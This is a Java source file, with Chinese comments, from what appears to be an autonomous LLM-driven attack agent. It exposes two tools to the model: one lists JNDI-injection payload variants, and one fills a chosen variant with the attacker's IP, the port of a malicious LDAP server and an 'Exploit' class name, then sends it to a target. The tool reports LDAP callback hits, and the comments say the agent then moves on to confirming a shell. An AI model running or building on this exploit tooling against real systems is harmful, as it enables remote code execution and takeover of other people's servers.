package agent;

import dev.langchain4j.agent.tool.Tool;
import toolkit.MaliciousLDAPServer;

/**
 * Payload 变体工具：把"变体目录"和"变体尝试"注册为 LLM 可调用的工具。
 *
 * 核心思想：变体尝试不是硬编码顺序，而是自主尝试。
 * LLM 通过 listPayloadVariants 查看目录，自主决定以下内容：
 *   - 先试哪个变体（v02 合法 DN，而不是必失败的 v08 RMI）；
 *   - 试完后观察返回的 LDAP 回调次数变化决定下一步；
 *   - 命中后停止尝试，转去验证 shell。
 */
public class PayloadVariantTool {

    @Tool("列出全部可用 payload 变体目录：每个变体包含 id、原理、payload 模板、前置依赖、命中判据。调用 tryPayloadVariant 前先看这里，选择依赖满足且命中判据可观察的变体")
    public String listPayloadVariants() {
        return PayloadVariants.catalogText();
    }

    /**
     * 尝试一个变体：自动把攻击机 LDAP 地址填入模板并发送。
     * 返回 HTTP 状态 + 本次尝试前后的 LDAP 回调次数对比。
     */
    @Tool("按变体 id 尝试一种 payload 变体：自动填入攻击机 LDAP 地址（含端口）与恶意类名，发送到目标后返回 HTTP 状态和 LDAP 回调次数变化。ldapSearchHits 增加即该变体命中 JNDI lookup；命中后应继续验证类下载与 shell 输出")
    public String tryPayloadVariant(String host, int port, String path, String variantId, int timeoutMs) {
        PayloadVariants.Variant v = PayloadVariants.byId(variantId);
        if (v == null) {
            return "unknown variantId=" + variantId + "（先用 listPayloadVariants 查看可用 id）";
        }
        if ("RMI_SERVER".equals(v.requires)) {
            return "variant " + variantId + " 需要 RMI 服务端，本工具包未提供，预期失败，勿选";
        }
        String payload = PayloadVariants.render(v, AttackTools.cfg().attackerIp,
                AttackTools.DEFAULT_LDAP_PORT, "Exploit");
        int before = MaliciousLDAPServer.getSearchHits();
        String sent = AttackTools.sendRaw(host, port, path, payload, timeoutMs);
        int after = MaliciousLDAPServer.getSearchHits();
        return "variant=" + v.id + " (" + v.name + ") payload=" + payload + "\n"
                + sent + "\n"
                + "ldapSearchHits " + before + " -> " + after
                + (after > before ? "  ★ 命中：JNDI lookup 已触发"
                                  : "  未命中：LDAP 无回调");
    }
}
